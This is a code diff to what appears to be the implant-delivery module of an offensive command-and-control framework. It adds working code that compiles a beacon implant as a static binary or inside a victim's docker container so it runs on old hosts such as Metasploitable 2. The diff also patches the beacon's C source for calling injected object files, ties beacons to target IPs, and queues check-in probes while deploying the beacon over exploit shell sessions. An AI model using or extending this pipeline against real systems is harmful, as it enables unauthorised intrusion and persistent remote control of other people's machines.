@@ -34,6 +34,9 @@ import base64
 import json
 import logging
 import os
+import re
+import secrets
+import shlex
 import shutil
 import ssl
 import time
@@ -63,6 +66,7 @@ DEFAULT_TIMEOUT_S = 30.0
 DEPLOY_WAIT_DEFAULT_S = 45.0
 HTTP_TIMEOUT_S = 10.0
 _POLL_INTERVAL_S = 1.0
+_HANDOFF_PROBE_PREFIX = "__LZ_HANDOFF_"
 _CLIENT_LOCAL_PATHS: dict[str, str] = {
     "blacksandbeacon": "temp_uploads/blacksandbeacon",
 }
@@ -420,6 +424,7 @@ def stage_client(
         log.warning("stage_client %s exited %s", addon.name, result.returncode)
     if result.stdout:
         log.info("stage_client %s: %s", addon.name, result.stdout[-400:])
+    _build_portable_beacon(addon, cfg)
     _apply_upstream_report_patch(addon, cfg)
     client_id = str(data.get("beacon_client_id", "") or _DEFAULT_BEACON_CLIENT_ID).strip() or _DEFAULT_BEACON_CLIENT_ID
     try:
@@ -436,6 +441,171 @@ def stage_client(
         raise ValueError(f"no client binary staged for {addon.name!r}: expected {staged_path}")
     _raw_stage_for_implant_serving(addon.name, staged_path, cfg)
     return str(staged_path)
+
+
+def _docker_container_for_ip(target: str) -> str:
+    """Resolve the running container id that owns a docker IP.
+
+    Args:
+        target: IP address of a docker-networked lab host.
+
+    Returns:
+        Container name, or "" when the host is not a docker container.
+    """
+    if not target:
+        return ""
+    argv = [
+        "docker",
+        "ps",
+        "--format",
+        "{{.ID}}",
+    ]
+    try:
+        from core.safe_exec import safe_run_argv
+
+        listing = safe_run_argv(argv, timeout=20)
+        if listing.returncode != 0:
+            return ""
+        for cid in (listing.stdout or "").split():
+            probe = safe_run_argv(
+                [
+                    "docker",
+                    "inspect",
+                    "-f",
+                    "{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}",
+                    cid,
+                ],
+                timeout=20,
+            )
+            if target in (probe.stdout or "").split():
+                return cid.strip()
+    except Exception as exc:
+        log.debug("container lookup for %s failed: %s", target, exc)
+    return ""
+
+
+def _build_beacon_in_container(addon: ClientAddon, config: BofDeliveryConfig, target: str) -> bool:
+    """Build the beacon inside the target container with its own toolchain.
+
+    A binary built with the target's own compiler/loader runs on that
+    userland unconditionally (old glibc, 32-bit distros). The source
+    checkout is copied in, compiled with the same gcc recipe the Makefile
+    uses, and the result is staged through the normal delivery path.
+
+    Args:
+        addon: Loaded client addon.
+        config: Delivery configuration holding the sessions root.
+        target: Victim address (docker container IP).
+
+    Returns:
+        True when the in-container binary was built and staged.
+    """
+    from core.safe_exec import safe_run_argv, safe_run_shell
+
+    container = _docker_container_for_ip(target)
+    if not container:
+        return False
+    checkout = (Path(BASE_DIR) / addon.install_path).resolve()
+    if not checkout.is_dir():
+        return False
+    probe = safe_run_argv(["docker", "exec", container, "gcc", "-dumpversion"], timeout=30)
+    if probe.returncode != 0:
+        log.debug("in-container build skipped: no gcc in %s", container)
+        return False
+    tag = f"lz_bsb_src_{int(time.time())}"
+    archive = checkout / "build" / f"{tag}.tgz"
+    try:
+        checkout.mkdir(parents=True, exist_ok=True)
+        result = safe_run_shell(
+            f"tar czf {shlex.quote(str(archive))} --exclude build --exclude .git .",
+            allow=True,
+            reason="pack beacon sources for in-container build",
+            cwd=str(checkout),
+            timeout=120,
+        )
+        if result.returncode != 0 or not archive.is_file():
+            return False
+        push = safe_run_argv(["docker", "cp", str(archive), f"{container}:/tmp/"], timeout=60)
+        if push.returncode != 0:
+            return False
+        build_cmd = (
+            "mkdir -p /tmp/bsb && cd /tmp/bsb && tar xzf /tmp/{tag}.tgz && "
+            "mkdir -p build && "
+            "gcc -std=gnu99 -Wall -O2 -I include -I beacons/v1 "
+            "-o build/beacon beacons/v1/beacon.c include/config.c include/aes.c "
+            "include/aes_cfb.c include/cJSON.c include/beacon_common.c "
+            "-rdynamic -lcurl -lssl -lcrypto"
+        ).format(tag=tag)
+        build = safe_run_argv(
+            ["docker", "exec", container, "sh", "-c", build_cmd],
+            timeout=600,
+        )
+        if build.returncode != 0:
+            log.debug("in-container beacon build failed: %s", (build.stderr or "")[-300:])
+            return False
+        pull = safe_run_argv(
+            ["docker", "cp", f"{container}:/tmp/bsb/build/beacon", str(checkout / "build" / "beacon")],
+            timeout=60,
+        )
+        if pull.returncode != 0:
+            return False
+    finally:
+        try:
+            archive.unlink(missing_ok=True)
+        except OSError:
+            pass
+    staged_path = Path(config.sessions_dir) / _CLIENT_LOCAL_PATHS[addon.name]
+    try:
+        shutil.copy2(checkout / "build" / "beacon", staged_path)
+    except OSError as exc:
+        log.warning("in-container beacon staged copy failed: %s", exc)
+        return False
+    log.info("%s beacon built inside %s and staged (%s)", addon.name, container, staged_path)
+    return True
+
+
+def _build_portable_beacon(addon: ClientAddon, config: BofDeliveryConfig) -> bool:
+    """Build the beacon as a static musl binary when docker is available.
+
+    Host toolchains link the beacon against the operator glibc; old
+    targets (Metasploitable 2, glibc 2.7) cannot run those binaries. A
+    static musl build inside an alpine container runs on any Linux
+    userland. Falls back silently to whatever the addon/host toolchain
+    already produced.
+
+    Args:
+        addon: Loaded client addon.
+        config: Delivery configuration holding the sessions root.
+
+    Returns:
+        True when the portable binary was built and staged.
+    """
+    from core.safe_exec import safe_run_shell
+
+    checkout = (Path(BASE_DIR) / addon.install_path).resolve()
+    if not checkout.is_dir():
+        return False
+    checkout_quoted = shlex.quote(str(checkout))
+    result = safe_run_shell(
+        f"docker run --rm -v {checkout_quoted}:/src -w /src alpine:latest sh -c "
+        f"'apk add --no-cache build-base curl-dev openssl-dev >/dev/null 2>&1 && "
+        f"make beacon LDFLAGS=\"-static -lcurl -lssl -lcrypto\" >/dev/null 2>&1 && "
+        f"strip build/beacon'",
+        allow=True,
+        reason=f"build static {addon.name} beacon for old-glibc targets",
+        timeout=900,
+    )
+    if result.returncode != 0:
+        log.debug("portable beacon build skipped: %s", (result.stderr or "")[-200:])
+        return False
+    staged_path = Path(config.sessions_dir) / _CLIENT_LOCAL_PATHS[addon.name]
+    try:
+        shutil.copy2(checkout / "build" / "beacon", staged_path)
+    except OSError as exc:
+        log.warning("portable beacon staged copy failed: %s", exc)
+        return False
+    log.info("portable %s beacon built and staged (%s)", addon.name, staged_path)
+    return True
 
 
 def _raw_stage_for_implant_serving(addon_name: str, binary_path: Path, config: BofDeliveryConfig) -> None:
@@ -602,6 +772,7 @@ def _apply_upstream_report_patch(addon: ClientAddon, config: BofDeliveryConfig) 
         log.info("upstream AES is already CFB-128 python-compatible (%s)", aes_path)
     else:
         log.info("aes source already EVP-based (%s)", aes_path)
+    touched = _apply_compat_patch(checkout) or touched
     if not touched:
         return False
     rebuild = safe_run_shell(
@@ -614,6 +785,9 @@ def _apply_upstream_report_patch(addon: ClientAddon, config: BofDeliveryConfig) 
     if rebuild.returncode != 0:
         log.warning("client rebuild failed: %s", (rebuild.stderr or "")[-300:])
         return False
+    if _build_portable_beacon(addon, config):
+        log.info("rebuilt %s with the wire-protocol patches (static build)", addon.name)
+        return True
     staged_path = Path(config.sessions_dir) / _CLIENT_LOCAL_PATHS[addon.name]
     try:
         shutil.copy2(checkout / "build" / "beacon", staged_path)
@@ -621,6 +795,100 @@ def _apply_upstream_report_patch(addon: ClientAddon, config: BofDeliveryConfig) 
         log.warning("re-staged copy failed: %s", exc)
     log.info("rebuilt %s with the wire-protocol patches", addon.name)
     return True
+
+
+_COMPAT_SOURCE_RELPATH = "include/beacon_common.c"
+_COMPAT_MARKER = "BSB_OLD_LIBCURL_COMPAT"
+_COMPAT_ASM_RE = re.compile(
+    r"    asm volatile\(\"mov %%rsp, %%rax.*?\n                 : \"rax\", \"rcx\", \"rdx\", \"rsi\", \"rdi\", \"r8\", \"r9\", \"r10\", \"r11\", \"xmm0\", \"xmm1\",\n"
+    r"                   \"xmm2\", \"xmm3\", \"xmm4\", \"xmm5\", \"xmm6\", \"xmm7\", \"memory\", \"cc\"\);",
+    re.DOTALL,
+)
+_COMPAT_ASM_64 = r"""#if defined(__x86_64__)
+    asm volatile("mov %%rsp, %%rax\n\t"
+                 "and $-16, %%rsp\n\t"
+                 "sub $16, %%rsp\n\t"
+                 "mov %%rax, 8(%%rsp)\n\t"
+                 "mov %0, %%rdi\n\t"
+                 "mov %1, %%rsi\n\t"
+                 "xor %%eax, %%eax\n\t"
+                 "call *%2\n\t"
+                 "mov 8(%%rsp), %%rax\n\t"
+                 "mov %%rax, %%rsp\n\t"
+                 :
+                 : "r"(args), "r"(arglen), "r"(func)
+                 : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11", "memory", "cc");
+#elif defined(__i386__)
+    asm volatile("mov %%esp, %%eax\n\t"
+                 "and $-16, %%esp\n\t"
+                 "sub $16, %%esp\n\t"
+                 "mov %%eax, 8(%%esp)\n\t"
+                 "push %2\n\t"
+                 "push %1\n\t"
+                 "call *%0\n\t"
+                 "add $8, %%esp\n\t"
+                 "mov 8(%%esp), %%eax\n\t"
+                 "mov %%eax, %%esp\n\t"
+                 :
+                 : "r"(func), "g"(arglen), "g"(args)
+                 : "eax", "ecx", "edx", "esi", "edi", "memory", "cc");
+#else
+    func(args, arglen);
+#endif"""
+
+
+def _apply_compat_patch(checkout: Path) -> bool:
+    """Apply the old-toolchain compatibility guards to beacon_common.c.
+
+    Idempotent per checkout reset: guards the two curl options absent
+    from libcurl 0.9.8-era builds and makes the BOF-call stack-alignment
+    asm architecture-aware so the beacon also builds on 32-bit
+    userlands with gcc 4.x.
+
+    Args:
+        checkout: Beacon repository root.
+
+    Returns:
+        True when the source was modified.
+    """
+    source_path = checkout / _COMPAT_SOURCE_RELPATH
+    try:
+        source = source_path.read_text(encoding="utf-8", errors="replace")
+    except OSError as exc:
+        log.warning("compat source unreadable at %s: %s", source_path, exc)
+        return False
+    if _COMPAT_MARKER in source:
+        return False
+    touched = False
+    if "        curl_easy_setopt(curl, CURLOPT_PINNEDPUBLICKEY, pin_buf);" in source:
+        source = source.replace(
+            "        curl_easy_setopt(curl, CURLOPT_PINNEDPUBLICKEY, pin_buf);",
+            "#ifdef CURLOPT_PINNEDPUBLICKEY\n"
+            "        curl_easy_setopt(curl, CURLOPT_PINNEDPUBLICKEY, pin_buf);\n"
+            "#endif",
+            1,
+        )
+        touched = True
+    if '    curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, "");' in source:
+        source = source.replace(
+            '    curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, "");',
+            "#ifdef CURLOPT_ACCEPT_ENCODING\n"
+            '    curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, "");\n'
+            "#endif",
+            1,
+        )
+        touched = True
+    if _COMPAT_ASM_RE.search(source):
+        source = _COMPAT_ASM_RE.sub(lambda _match: _COMPAT_ASM_64, source, count=1)
+        touched = True
+    if touched:
+        source = (
+            "/* " + _COMPAT_MARKER + ": old-toolchain guards applied by bof_delivery. */\n"
+            + source
+        )
+        source_path.write_text(source, encoding="utf-8")
+        log.info("old-toolchain compat patch applied (%s)", source_path)
+    return touched
 
 
 def key_missing_from_error(exc: Exception) -> bool:
@@ -814,12 +1082,51 @@ def _beacons_from_history(config: BofDeliveryConfig) -> list[dict[str, Any]]:
     return list(records.values())
 
 
+def beacon_for_target(
+    target: str,
+    config: BofDeliveryConfig | None = None,
+    payload: dict[str, Any] | None = None,
+) -> str:
+    """Return the client id of a beacon that reported from ``target``.
+
+    Args:
+        target: Target address to match against beacon record IPs.
+        config: Optional delivery configuration override.
+        payload: Optional payload.json mapping override (tests).
+
+    Returns:
+        Sanitized beacon client id, or an empty string when none matches.
+    """
+    from core.config import load_payload
+    from modules.beacon_history import read_records
+
+    cfg = config or BofDeliveryConfig()
+    data = payload if payload is not None else load_payload()
+    wanted = str(target or "").strip()
+    if not wanted:
+        return ""
+    for beacon in recent_beacons(cfg, data):
+        client_id = str(beacon.get("client_id", "") or "").strip()
+        if not client_id:
+            continue
+        try:
+            rows = read_records(client_id, config=_history_config(cfg))
+        except Exception:
+            continue
+        for row in reversed(rows):
+            ips = {ip.strip() for ip in str(row.get("ips", "") or "").split(",")}
+            if wanted in ips:
+                return client_id
+    return ""
+
+
 def wait_for_beacon(
     client_id: str | None = None,
     since: float | None = None,
     timeout: float = DEPLOY_WAIT_DEFAULT_S,
     config: BofDeliveryConfig | None = None,
     payload: dict[str, Any] | None = None,
+    command: str | None = None,
 ) -> dict[str, Any] | None:
     """Wait until a beacon answers, then return its latest record.
 
@@ -829,9 +1136,10 @@ def wait_for_beacon(
         timeout: Wall-clock limit.
         config: Optional delivery configuration override.
         payload: Optional payload.json mapping override (tests).
+        command: Optional exact command to match, used to identify one probe.
 
     Returns:
-        The latest beacon record, or None after the timeout.
+        The matching beacon record, or None after the timeout.
     """
     from modules.beacon_history import read_records
 
@@ -846,6 +1154,8 @@ def wait_for_beacon(
             except Exception:
                 rows = []
             for row in reversed(rows):
+                if command is not None and str(row.get("command", "")) != command:
+                    continue
                 if _record_after(row, since):
                     return row
         else:
@@ -1093,6 +1403,9 @@ def deploy_client(
     staged = stage_client(addon.name, cfg, data)
     if not staged:
         raise ValueError(f"client binary staging failed for {addon.name!r}")
+    if _build_beacon_in_container(addon, cfg, target):
+        staged = str(Path(cfg.sessions_dir) / _CLIENT_LOCAL_PATHS[addon.name])
+        _raw_stage_for_implant_serving(addon.name, Path(staged), cfg)
     client_id = str(data.get("beacon_client_id", "") or _DEFAULT_BEACON_CLIENT_ID).strip() or _DEFAULT_BEACON_CLIENT_ID
     paths = _deploy_paths(addon)
     stage_payload_b64 = _stage_payload_b64()
@@ -1101,6 +1414,14 @@ def deploy_client(
         return {
             "success": False,
             "reason": f"no exec session on {target}: open one with atomic_exploit run or atomic_shell",
+            "client_id": "",
+            "deployed": False,
+        }
+    probe_command = f"echo {_HANDOFF_PROBE_PREFIX}{secrets.token_hex(6)}"
+    if not queue_to_beacon(client_id, probe_command, cfg, data):
+        return {
+            "success": False,
+            "reason": f"failed to queue check-in probe for beacon {client_id}",
             "client_id": "",
             "deployed": False,
         }
@@ -1126,13 +1447,14 @@ def deploy_client(
         session.run(remote_line, timeout=60)
         style = "disk" if "curl" in template else ("upstream-stage" if "stage_payload_b64" in template else "raw-s")
         attempts.append({"attempt": index, "style": style, "ran": True, "waited": probe})
-        record = wait_for_beacon(client_id, since=since, timeout=probe, config=cfg, payload=data)
+        record = wait_for_beacon(
+            client_id, since=since, timeout=probe, config=cfg, payload=data, command=probe_command
+        )
         if record:
             break
         remaining -= probe
         if remaining <= 0:
             break
-    queue_to_beacon(client_id, "pwd", cfg, data)
     checked_id = str(record.get("client_id", "")) if record else ""
     style = attempts[-1]["style"] if attempts else "none"
     return {
@@ -1382,6 +1704,7 @@ def bof_results(
 __all__ = [
     "BofDeliveryConfig",
     "ClientAddon",
+    "beacon_for_target",
     "bof_results",
     "c2_reachable",
     "delivery_command",
